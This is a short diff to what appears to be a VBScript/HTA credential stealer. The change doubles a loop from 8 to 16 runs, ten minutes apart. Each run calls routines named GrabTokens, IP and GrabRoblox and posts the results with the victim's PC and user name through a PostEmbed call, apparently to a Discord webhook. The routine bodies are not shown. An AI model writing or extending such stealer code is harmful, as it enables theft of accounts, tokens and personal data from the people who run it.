@@ -22,12 +22,12 @@ Call GrabRoblox
 
 ' --- Re-run grab chain 8x (every 10 min) ---
 Dim runCount
-For runCount = 1 To 8
-    Call PostEmbed(":repeat: Re-grab " & runCount & "/8", "PC: " & PC & " | User: " & USER, 3447003)
+For runCount = 1 To 16
+    Call PostEmbed(":repeat: Re-grab " & runCount & "/16", "PC: " & PC & " | User: " & USER, 3447003)
     Call GrabTokens
     Call IP
     Call GrabRoblox
-    If runCount < 8 Then Call SleepMinutes(10)
+    If runCount < 16 Then Call SleepMinutes(10)
 Next
 
 window.close()
